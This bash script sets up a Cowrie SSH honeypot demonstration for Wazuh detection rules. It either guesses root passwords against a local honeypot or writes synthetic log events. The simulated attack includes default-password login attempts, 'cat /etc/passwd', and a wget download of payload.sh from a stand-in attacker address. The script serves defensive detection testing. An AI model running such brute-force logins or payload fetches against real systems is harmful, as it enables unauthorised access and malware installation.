#!/usr/bin/env bash
# Demonstrate Cowrie honeypot detection.
#
# If `sshpass` and `ssh` are available this performs a real (but harmless)
# interaction against the honeypot: failed logins, a successful login, and a
# short post-exploitation command sequence. Otherwise it appends equivalent
# JSON events so the Wazuh rules can still be demonstrated.
#
#   ./scripts/simulate-cowrie.sh [path-to-cowrie.json]
set -euo pipefail

cd "$(dirname "$0")/.."
LOG="${1:-logs/cowrie/cowrie.json}"
HOST="${COWRIE_HOST:-localhost}"
PORT="${COWRIE_SSH_PORT:-2222}"
ATTACKER="203.0.113.66"
SENSOR="cowrie-giftastic"

mkdir -p "$(dirname "$LOG")"
touch "$LOG"

now() { date -u +"%Y-%m-%dT%H:%M:%S.000Z"; }

# emit <eventid> <username> <password> <input> <message>
emit() {
  local session
  session="$(printf '%08x' "$RANDOM")"
  printf '{"eventid":"%s","src_ip":"%s","src_port":54321,"dst_ip":"10.0.0.9","dst_port":2222,"session":"%s","protocol":"ssh","username":"%s","password":"%s","input":"%s","message":"%s","sensor":"%s","timestamp":"%s"}\n' \
    "$1" "$ATTACKER" "$session" "$2" "$3" "$4" "$5" "$SENSOR" "$(now)" >> "$LOG"
}

if command -v sshpass >/dev/null 2>&1 && command -v ssh >/dev/null 2>&1; then
  echo "==> Live SSH interaction with the Cowrie honeypot on $HOST:$PORT"
  for pw in 123456 admin letmein password; do
    sshpass -p "$pw" ssh -tt -p "$PORT" \
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=5 -o LogLevel=ERROR root@"$HOST" exit || true
  done
  sshpass -p 'password' ssh -tt -p "$PORT" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 -o LogLevel=ERROR root@"$HOST" \
    'id; uname -a; cat /etc/passwd; wget http://198.51.100.9/payload.sh; chmod +x payload.sh; crontab -l' || true
  echo "    Live interaction complete."
else
  echo "==> sshpass/ssh not found; emitting synthetic Cowrie events instead"
  emit "cowrie.session.connect" "" "" "" "New connection: $ATTACKER:54321"
  emit "cowrie.login.failed" "root" "123456" "" "login attempt [root/123456] failed"
  emit "cowrie.login.failed" "admin" "admin" "" "login attempt [admin/admin] failed"
  emit "cowrie.login.failed" "root" "letmein" "" "login attempt [root/letmein] failed"
  emit "cowrie.login.failed" "root" "password" "" "login attempt [root/password] failed"
  emit "cowrie.login.failed" "oracle" "oracle" "" "login attempt [oracle/oracle] failed"
  emit "cowrie.login.failed" "root" "toor" "" "login attempt [root/toor] failed"
  emit "cowrie.login.success" "root" "password" "" "login attempt [root/password] succeeded"
  emit "cowrie.command.input" "root" "password" "id" ""
  emit "cowrie.command.input" "root" "password" "uname -a" ""
  emit "cowrie.command.input" "root" "password" "cat /etc/passwd" ""
  emit "cowrie.command.input" "root" "password" "wget http://198.51.100.9/payload.sh" ""
  emit "cowrie.session.file_download" "root" "password" "" "Downloaded http://198.51.100.9/payload.sh"
  emit "cowrie.command.input" "root" "password" "chmod +x payload.sh" ""
  emit "cowrie.command.input" "root" "password" "crontab -l" ""
  emit "cowrie.session.closed" "root" "password" "" "Connection closed"
fi

echo
echo "Cowrie events are in $LOG"
echo "Open the Wazuh dashboard (https://localhost) and filter on rule.groups: cowrie"
